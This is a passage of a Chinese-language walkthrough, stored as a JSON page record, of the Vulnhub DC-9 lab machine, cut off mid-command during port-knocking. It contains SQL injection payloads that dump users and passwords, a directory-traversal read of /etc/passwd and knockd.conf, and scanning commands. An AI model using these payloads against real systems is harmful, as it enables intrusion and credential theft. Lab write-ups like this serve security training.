{"pageProps":{"postData":{"id":"VulnhubDC-9","contentHtml":"<h1>DC-9</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-9,412/\">https://www.vulnhub.com/entry/dc-9,412/</a></p>\n</blockquote>\n<h2>端口扫描主机发现</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>180</code>是靶机</p>\n<pre><code class=\"hljs language-php\">netdiscover -r <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nCurrently scanning: <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>   |   Screen View: Unique Hosts                                                  \n                                                                                                                      \n <span class=\"hljs-number\">4</span> Captured ARP Req/Rep packets, <span class=\"hljs-keyword\">from</span> <span class=\"hljs-number\">4</span> hosts.   Total size: <span class=\"hljs-number\">240</span>                                                      \n _____________________________________________________________________________\n   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      \n -----------------------------------------------------------------------------\n <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>    <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:c0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span>      <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">60</span>  VMware, Inc.                                                       \n <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>    <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:fb:ca:<span class=\"hljs-number\">45</span>      <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">60</span>  VMware, Inc.                                                       \n <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.180</span>  <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">41</span>:e1:<span class=\"hljs-number\">8</span>f      <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">60</span>  VMware, Inc.                                                       \n <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>  <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:fe:ca:<span class=\"hljs-number\">7</span>a      <span class=\"hljs-number\">1</span>      <span class=\"hljs-number\">60</span>  VMware, Inc.  \n</code></pre>\n</li>\n<li>\n<p>探测主机所有开放端口，仅存在<code>80</code>端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.180</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-04 12:14 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.180</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00038</span>s latency).\nNot shown: <span class=\"hljs-number\">65534</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">41</span>:E1:<span class=\"hljs-number\">8</span>F (VMware)\n</code></pre>\n</li>\n<li>\n<p>探测服务版本以及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p <span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.180</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-04 12:16 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.180</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00058</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">38</span> ((Debian))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">41</span>:E1:<span class=\"hljs-number\">8</span>F (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span> \n//\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-04 <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">10</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00020</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-csrf: \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>:<span class=\"hljs-number\">80</span>/manage.php\n|     Form <span class=\"hljs-built_in\">id</span>: \n|     Form action: manage.php\n|     \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>:<span class=\"hljs-number\">80</span>/search.php\n|     Form <span class=\"hljs-built_in\">id</span>: \n|_    Form action: results.php\n|_http-vuln-cve2017-<span class=\"hljs-number\">1001000</span>: ERROR: Script execution failed (use -d to debug)\n| http-enum: \n|   /css/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.38 (debian)'</span>\n|_  /includes/: Potentially interesting directory w/ listing on <span class=\"hljs-string\">'apache/2.4.38 (debian)'</span>\n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> DOM based XSS.\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">41</span>:E1:8F (VMware)\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问主页，网站指纹识别不是知名<code>CMS</code></p>\n<p><img src=\"/post-images/VulnhubDC-9/image46.png\" alt=\"image.png\"></p>\n<ul>\n<li><code>Display All Records</code> 页面是所有用户的信息</li>\n<li><code>Search</code> 为搜索页面，存在搜索框</li>\n<li><code>Manage</code> 是登陆页面</li>\n</ul>\n</li>\n<li>\n<p>扫描网站目录</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span> -x <span class=\"hljs-number\">403</span>,<span class=\"hljs-number\">404</span>\n//\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">00</span>] Starting:                                                                                                                                                                                              \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">22</span>] <span class=\"hljs-number\">200</span> -    0B  - /config.php                                       \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">23</span>] <span class=\"hljs-number\">301</span> -  314B  - /css  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>/css/              \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">25</span>] <span class=\"hljs-number\">200</span> - 1001B  - /display.php                                      \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">31</span>] <span class=\"hljs-number\">301</span> -  319B  - /includes  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>/includes/    \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">31</span>] <span class=\"hljs-number\">200</span> -  408B  - /includes/\n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">35</span>] <span class=\"hljs-number\">302</span> -    0B  - /logout.php  ->  manage.php                       \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">36</span>] <span class=\"hljs-number\">200</span> -  548B  - /manage.php                                       \n[<span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">48</span>] <span class=\"hljs-number\">200</span> -  485B  - /search.php      \n</code></pre>\n</li>\n<li>\n<p><code>Search</code> 为搜索页面，可能存在<code>SQL</code>注入，抓包修改<code>POST</code>参数</p>\n<ul>\n<li>\n<p>尝试闭合</p>\n<pre><code class=\"hljs language-python\">search=<span class=\"hljs-number\">0</span><span class=\"hljs-string\">' # 无结果\nsearch='</span><span class=\"hljs-keyword\">or</span><span class=\"hljs-string\">'1'</span>=<span class=\"hljs-string\">'1 # 结果出来了，是Display All Records的结果\n</span></code></pre>\n<p>确认存在注入</p>\n</li>\n<li>\n<p>继续注入（其实可以用<code>sqlmap</code>注入）</p>\n<pre><code class=\"hljs language-python\">search=<span class=\"hljs-string\">'or'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">' order by 6 %23 # 字段数为6\nsearch='</span><span class=\"hljs-keyword\">or</span><span class=\"hljs-string\">'1'</span>=<span class=\"hljs-string\">'0'</span> union select <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span> %<span class=\"hljs-number\">23</span> <span class=\"hljs-comment\"># 显示位，全都可以显示</span>\nsearch=<span class=\"hljs-string\">'or'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">' union select user(),2,3,version(),database(),6 %23 # dbuser@localhost ，10.3.17-MariaDB-0+deb10u1 ，Staff\n\n</span></code></pre>\n</li>\n<li>\n<p>表名</p>\n<pre><code class=\"hljs language-python\">search=<span class=\"hljs-string\">'or'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() %23\n</span></code></pre>\n<p><code>StaffDetails,Users</code> ，我们需要<code>Users</code> 表的数据</p>\n</li>\n<li>\n<p>列名</p>\n<pre><code class=\"hljs language-python\">search=<span class=\"hljs-string\">'or'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_schema=database() and table_name='</span>Users<span class=\"hljs-string\">' %23\n</span></code></pre>\n<p><code>UserID,Username,Password</code></p>\n</li>\n<li>\n<p>数据</p>\n<pre><code class=\"hljs language-python\">search=<span class=\"hljs-string\">'or'</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">0</span><span class=\"hljs-string\">' union select group_concat('</span>~<span class=\"hljs-string\">',Username,'</span>:<span class=\"hljs-string\">',Password,'</span>~<span class=\"hljs-string\">'),2,3,4,5,6 from Users %23\n</span></code></pre>\n<p><code>admin:856f5de590ef37314e7c3bdf6f8a66dc</code> 拿到<code>admin</code>账户，密码看着像是<code>MD5</code>加密后的，使用网站破解出来为<code>transorbital1</code></p>\n</li>\n<li>\n<p>顺便再把<code>users</code>库的<code>UserDetails</code> 表数据也扒下来</p>\n<pre><code class=\"hljs language-python\">+----+------------+---------------+---------------------+-----------+-----------+\n| <span class=\"hljs-built_in\">id</span> | lastname   | password      | reg_date            | username  | firstname |\n+----+------------+---------------+---------------------+-----------+-----------+\n| <span class=\"hljs-number\">1</span>  | Moe        | 3kfs86sfd     | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | marym     | Mary      |\n| <span class=\"hljs-number\">2</span>  | Dooley     | 468sfdfsd2    | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | julied    | Julie     |\n| <span class=\"hljs-number\">3</span>  | Flintstone | 4sfd87sfd1    | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | fredf     | Fred      |\n| <span class=\"hljs-number\">4</span>  | Rubble     | RocksOff      | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | barneyr   | Barney    |\n| <span class=\"hljs-number\">5</span>  | Cat        | TC&#x26;TheBoyz    | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | tomc      | Tom       |\n| <span class=\"hljs-number\">6</span>  | Mouse      | B8m<span class=\"hljs-comment\">#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span>\n| <span class=\"hljs-number\">7</span>  | Flintstone | Pebbles       | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | wilmaf    | Wilma     |\n| <span class=\"hljs-number\">8</span>  | Rubble     | BamBam01      | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | bettyr    | Betty     |\n| <span class=\"hljs-number\">9</span>  | Bing       | UrAG0D!       | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | chandlerb | Chandler  |\n| <span class=\"hljs-number\">10</span> | Tribbiani  | Passw0rd      | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | joeyt     | Joey      |\n| <span class=\"hljs-number\">11</span> | Green      | yN72<span class=\"hljs-comment\">#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span>\n| <span class=\"hljs-number\">12</span> | Geller     | ILoveRachel   | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | rossg     | Ross      |\n| <span class=\"hljs-number\">13</span> | Geller     | 3248dsds7s    | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | monicag   | Monica    |\n| <span class=\"hljs-number\">14</span> | Buffay     | smellycats    | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | phoebeb   | Phoebe    |\n| <span class=\"hljs-number\">15</span> | McScoots   | YR3BVxxxw87   | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | scoots    | Scooter   |\n| <span class=\"hljs-number\">16</span> | Trump      | Ilovepeepee   | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">26</span> | janitor   | Donald    |\n| <span class=\"hljs-number\">17</span> | Morrison   | Hawaii-Five-<span class=\"hljs-number\">0</span> | <span class=\"hljs-number\">2019</span>-<span class=\"hljs-number\">12</span>-<span class=\"hljs-number\">29</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">58</span>:<span class=\"hljs-number\">28</span> | janitor2  | Scott     |\n+----+------------+---------------+---------------------+-----------+-----------+\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>尝试登录后台，成功登录，寻找可以利用的点</p>\n<p><img src=\"/post-images/VulnhubDC-9/image47.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>进入后台发现底下写着<code>File does not exist</code> 可能存在某个参数，使用常见参数进行测试比如<code>file</code></p>\n<pre><code class=\"hljs language-python\">/manage.php?file=../../../../etc/passwd\n</code></pre>\n<p>回显<code>/etc/passwd</code>文件内容</p>\n<pre><code class=\"hljs language-python\">File does <span class=\"hljs-keyword\">not</span> exist\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:/root:/<span class=\"hljs-built_in\">bin</span>/bash \ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:/usr/sbin:/usr/sbin/nologin \n<span class=\"hljs-built_in\">bin</span>:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin \nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:/dev:/usr/sbin/nologin \nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:/<span class=\"hljs-built_in\">bin</span>:/<span class=\"hljs-built_in\">bin</span>/sync \ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:/usr/games:/usr/sbin/nologin \nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:/var/cache/man:/usr/sbin/nologin \nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin \nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:/var/mail:/usr/sbin/nologin \nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:/var/spool/news:/usr/sbin/nologin \nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin \nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:/<span class=\"hljs-built_in\">bin</span>:/usr/sbin/nologin \nwww-data:x:<span class=\"hljs-number\">33</span>:<span class=\"hljs-number\">33</span>:www-data:/var/www:/usr/sbin/nologin \nbackup:x:<span class=\"hljs-number\">34</span>:<span class=\"hljs-number\">34</span>:backup:/var/backups:/usr/sbin/nologin \n<span class=\"hljs-built_in\">list</span>:x:<span class=\"hljs-number\">38</span>:<span class=\"hljs-number\">38</span>:Mailing <span class=\"hljs-type\">List</span> Manager:/var/<span class=\"hljs-built_in\">list</span>:/usr/sbin/nologin \nirc:x:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">39</span>:ircd:/var/run/ircd:/usr/sbin/nologin \ngnats:x:<span class=\"hljs-number\">41</span>:<span class=\"hljs-number\">41</span>:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin \nnobody:x:<span class=\"hljs-number\">65534</span>:<span class=\"hljs-number\">65534</span>:nobody:/nonexistent:/usr/sbin/nologin _apt:x:<span class=\"hljs-number\">100</span>:<span class=\"hljs-number\">65534</span>::/nonexistent:/usr/sbin/nologin \nsystemd-timesync:x:<span class=\"hljs-number\">101</span>:<span class=\"hljs-number\">102</span>:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin \nsystemd-network:x:<span class=\"hljs-number\">102</span>:<span class=\"hljs-number\">103</span>:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin \nsystemd-resolve:x:<span class=\"hljs-number\">103</span>:<span class=\"hljs-number\">104</span>:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin \nmessagebus:x:<span class=\"hljs-number\">104</span>:<span class=\"hljs-number\">110</span>::/nonexistent:/usr/sbin/nologin sshd:x:<span class=\"hljs-number\">105</span>:<span class=\"hljs-number\">65534</span>::/run/sshd:/usr/sbin/nologin \nsystemd-coredump:x:<span class=\"hljs-number\">999</span>:<span class=\"hljs-number\">999</span>:systemd Core Dumper:/:/usr/sbin/nologin \nmysql:x:<span class=\"hljs-number\">106</span>:<span class=\"hljs-number\">113</span>:MySQL Server,,,:/nonexistent:/<span class=\"hljs-built_in\">bin</span>/false \nmarym:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>:Mary Moe:/home/marym:/<span class=\"hljs-built_in\">bin</span>/bash \njulied:x:<span class=\"hljs-number\">1002</span>:<span class=\"hljs-number\">1002</span>:Julie Dooley:/home/julied:/<span class=\"hljs-built_in\">bin</span>/bash \nfredf:x:<span class=\"hljs-number\">1003</span>:<span class=\"hljs-number\">1003</span>:Fred Flintstone:/home/fredf:/<span class=\"hljs-built_in\">bin</span>/bash \nbarneyr:x:<span class=\"hljs-number\">1004</span>:<span class=\"hljs-number\">1004</span>:Barney Rubble:/home/barneyr:/<span class=\"hljs-built_in\">bin</span>/bash \ntomc:x:<span class=\"hljs-number\">1005</span>:<span class=\"hljs-number\">1005</span>:Tom Cat:/home/tomc:/<span class=\"hljs-built_in\">bin</span>/bash \njerrym:x:<span class=\"hljs-number\">1006</span>:<span class=\"hljs-number\">1006</span>:Jerry Mouse:/home/jerrym:/<span class=\"hljs-built_in\">bin</span>/bash \nwilmaf:x:<span class=\"hljs-number\">1007</span>:<span class=\"hljs-number\">1007</span>:Wilma Flintstone:/home/wilmaf:/<span class=\"hljs-built_in\">bin</span>/bash \nbettyr:x:<span class=\"hljs-number\">1008</span>:<span class=\"hljs-number\">1008</span>:Betty Rubble:/home/bettyr:/<span class=\"hljs-built_in\">bin</span>/bash \nchandlerb:x:<span class=\"hljs-number\">1009</span>:<span class=\"hljs-number\">1009</span>:Chandler Bing:/home/chandlerb:/<span class=\"hljs-built_in\">bin</span>/bash \njoeyt:x:<span class=\"hljs-number\">1010</span>:<span class=\"hljs-number\">1010</span>:Joey Tribbiani:/home/joeyt:/<span class=\"hljs-built_in\">bin</span>/bash \nrachelg:x:<span class=\"hljs-number\">1011</span>:<span class=\"hljs-number\">1011</span>:Rachel Green:/home/rachelg:/<span class=\"hljs-built_in\">bin</span>/bash \nrossg:x:<span class=\"hljs-number\">1012</span>:<span class=\"hljs-number\">1012</span>:Ross Geller:/home/rossg:/<span class=\"hljs-built_in\">bin</span>/bash \nmonicag:x:<span class=\"hljs-number\">1013</span>:<span class=\"hljs-number\">1013</span>:Monica Geller:/home/monicag:/<span class=\"hljs-built_in\">bin</span>/bash \nphoebeb:x:<span class=\"hljs-number\">1014</span>:<span class=\"hljs-number\">1014</span>:Phoebe Buffay:/home/phoebeb:/<span class=\"hljs-built_in\">bin</span>/bash \nscoots:x:<span class=\"hljs-number\">1015</span>:<span class=\"hljs-number\">1015</span>:Scooter McScoots:/home/scoots:/<span class=\"hljs-built_in\">bin</span>/bash \njanitor:x:<span class=\"hljs-number\">1016</span>:<span class=\"hljs-number\">1016</span>:Donald Trump:/home/janitor:/<span class=\"hljs-built_in\">bin</span>/bash \njanitor2:x:<span class=\"hljs-number\">1017</span>:<span class=\"hljs-number\">1017</span>:Scott Morrison:/home/janitor2:/<span class=\"hljs-built_in\">bin</span>/bash \n</code></pre>\n<p>可以看到用户是<code>UserDetails</code>表内的用户，密码可能就是<code>SSH</code>登录的密码，虽然扫描不到<code>SSH</code>，但是可能还是存在的</p>\n</li>\n</ol>\n<h2><strong>隐藏的SSH</strong></h2>\n<ol>\n<li>\n<p>我们重新扫描一下端口</p>\n<p>一开始我们使用的是：<code>nmap -sT -min-rate 10000 -p- 192.168.75.180</code> 即建立完TCP链接后才表示有该端口</p>\n<p>我们重新使用：<code>nmap -sS -min-rate 10000 -p- 192.168.75.180</code> 即在建立TCP前的三次握手协议中的第一步，我们发送一个SYN包看对方是否回复，<code>SYN/ACK</code>表示端口在监听 (开放)， 该端口就被标记为被过滤<code>filtered</code></p>\n<pre><code class=\"hljs language-python\">nmap -sS -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-04 <span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">45</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00011</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (reset)\nPORT   STATE    SERVICE\n<span class=\"hljs-number\">22</span>/tcp filtered ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>     http\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">41</span>:E1:8F (VMware)\n</code></pre>\n<p>重新扫描后可以看到<code>SSH</code>端口是被过滤<code>filtered</code> 状态的，所以可能就是存在<code>SSH</code>的，但是被防火墙过滤了</p>\n</li>\n<li>\n<p>一般隐藏<code>SSH</code>是通过<code>Knockd</code></p>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/guangdelw/p/18402272\">https://www.cnblogs.com/guangdelw/p/18402272</a></p>\n</blockquote>\n<p><code>Knockd</code> 的配置文件在<code>/etc/knockd.conf</code> ，我们包含确定是否是<code>Knockd</code></p>\n<pre><code class=\"hljs language-python\">/manage.php?file=../../../../etc/knockd.conf\n</code></pre>\n<p>成功包含！也就是说通过<code>Knockd</code>来隐藏了<code>SSH</code>服务</p>\n<pre><code class=\"hljs language-python\">File does <span class=\"hljs-keyword\">not</span> exist\n[options] \n\tUseSyslog \n[openSSH] \n\tsequence = <span class=\"hljs-number\">7469</span>,<span class=\"hljs-number\">8475</span>,<span class=\"hljs-number\">9842</span> \n\tseq_timeout = <span class=\"hljs-number\">25</span> \n\tcommand = /sbin/iptables -I INPUT -s %IP% -p tcp --dport <span class=\"hljs-number\">22</span> -j ACCEPT \n\ttcpflags = syn \n[closeSSH] \n\tsequence = <span class=\"hljs-number\">9842</span>,<span class=\"hljs-number\">8475</span>,<span class=\"hljs-number\">7469</span> \n\tseq_timeout = <span class=\"hljs-number\">25</span> \n\tcommand = /sbin/iptables -D INPUT -s %IP% -p tcp --dport <span class=\"hljs-number\">22</span> -j ACCEPT \n\ttcpflags = syn \n</code></pre>\n<p>分析一下配置文件：依次使用<code>TCP</code>访问<code>7469,8475,9842</code> 后（不超过25秒），则执行<code>[openSSH]</code> 区块的<code>command</code> ，用于允许来源IP（<code>%IP%</code>）的TCP连接通过22端口（SSH端口）</p>\n</li>\n<li>\n<p>分析完后，接下来就是进行敲门</p>\n<ul>\n<li>\n<p>使用<code>Kocked</code> 命令敲门</p>\n<pre><code class=\"hljs language-python\">knock <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.180</span> <span class=\"hljs-number\">7469</span> <span class=\"hljs-number\">8475</span> <span 